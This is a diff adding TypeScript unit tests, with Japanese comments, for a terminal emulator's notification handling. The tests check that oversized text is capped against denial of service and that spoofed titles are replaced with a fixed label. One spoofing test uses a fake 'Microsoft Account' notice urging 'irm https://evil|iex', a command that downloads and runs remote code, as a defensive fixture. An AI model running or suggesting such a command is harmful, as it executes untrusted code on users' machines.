@@ -8,6 +8,11 @@ import {
   parseNoncedPayload,
   planResize,
   isAltScreenModeParams,
+  capNotifyText,
+  NOTIFY_MAX,
+  TERMINAL_NOTIFY_TITLE,
+  buildOsc9Notification,
+  buildOsc777Notification,
 } from "./osc";
 
 describe("parseExitCode (#41: no false success/failure)", () => {
@@ -93,6 +98,88 @@ describe("parseOsc777 (#32: OSC 777;notify;title;body)", () => {
   it("notify with no title and no body => null (no info)", () => {
     expect(parseOsc777("notify;;")).toBeNull();
     expect(parseOsc777("notify")).toBeNull();
+  });
+
+  it("#73 SEC-7: 巨大 title/body は NOTIFY_MAX で省略記号付きに切り詰め", () => {
+    const hugeTitle = "T".repeat(1000);
+    const hugeBody = "B".repeat(1000);
+    const n = parseOsc777(`notify;${hugeTitle};${hugeBody}`);
+    expect(n?.title.length).toBe(NOTIFY_MAX + 1); // +1 は末尾の "…"
+    expect(n?.title.endsWith("…")).toBe(true);
+    expect(n?.body.length).toBe(NOTIFY_MAX + 1);
+    expect(n?.body.endsWith("…")).toBe(true);
+  });
+});
+
+describe("capNotifyText (#73 SEC-7: 通知本文の DoS 対策)", () => {
+  it("NOTIFY_MAX 以下はそのまま", () => {
+    expect(capNotifyText("short")).toBe("short");
+  });
+
+  it("ちょうど NOTIFY_MAX 文字はそのまま（境界値）", () => {
+    const exact = "x".repeat(NOTIFY_MAX);
+    expect(capNotifyText(exact)).toBe(exact);
+  });
+
+  it("NOTIFY_MAX を1文字でも超えると切り詰めて末尾に … を付与", () => {
+    const over = "x".repeat(NOTIFY_MAX + 1);
+    const capped = capNotifyText(over);
+    expect(capped.length).toBe(NOTIFY_MAX + 1);
+    expect(capped).toBe("x".repeat(NOTIFY_MAX) + "…");
+  });
+});
+
+describe("parseOsc9 (#73 SEC-7: 巨大 payload の cap)", () => {
+  it("NOTIFY_MAX 超の message は切り詰められる", () => {
+    const body = parseOsc9("A".repeat(500));
+    expect(body?.length).toBe(NOTIFY_MAX + 1);
+    expect(body?.endsWith("…")).toBe(true);
+  });
+});
+
+describe("buildOsc9Notification (#73 SEC-4: title は常に固定ラベル)", () => {
+  it("body があれば固定タイトル + そのまま body", () => {
+    expect(buildOsc9Notification("Build finished")).toEqual({
+      title: TERMINAL_NOTIFY_TITLE,
+      body: "Build finished",
+    });
+  });
+
+  it("null になる入力（空/ConEmu数値サブコマンド）はそのまま null", () => {
+    expect(buildOsc9Notification("")).toBeNull();
+    expect(buildOsc9Notification("4;50")).toBeNull();
+  });
+});
+
+describe("buildOsc777Notification (#73 SEC-4: OSC 777 title なりすまし対策)", () => {
+  it("攻撃者が偽装した title（例: なりすまし文言）は捨てられ、常に固定ラベルになる", () => {
+    const spoofed = buildOsc777Notification(
+      "notify;Microsoft Account;Session expired — run: irm https://evil|iex",
+    );
+    expect(spoofed).toEqual({
+      title: TERMINAL_NOTIFY_TITLE,
+      body: "Session expired — run: irm https://evil|iex",
+    });
+    expect(spoofed?.title).not.toContain("Microsoft");
+  });
+
+  it("title 省略時のフォールバック（'orb'）も同じく固定ラベルに上書きされる", () => {
+    expect(buildOsc777Notification("notify;;just a body")).toEqual({
+      title: TERMINAL_NOTIFY_TITLE,
+      body: "just a body",
+    });
+  });
+
+  it("null になる入力（notify 以外のサブコマンド等）はそのまま null", () => {
+    expect(buildOsc777Notification("something;else")).toBeNull();
+    expect(buildOsc777Notification("notify;;")).toBeNull();
+  });
+
+  it("body も NOTIFY_MAX で切り詰められる（title すり替えの後段でも DoS 対策は効く）", () => {
+    const n = buildOsc777Notification(`notify;x;${"B".repeat(1000)}`);
+    expect(n?.title).toBe(TERMINAL_NOTIFY_TITLE);
+    expect(n?.body.length).toBe(NOTIFY_MAX + 1);
+    expect(n?.body.endsWith("…")).toBe(true);
   });
 });
 
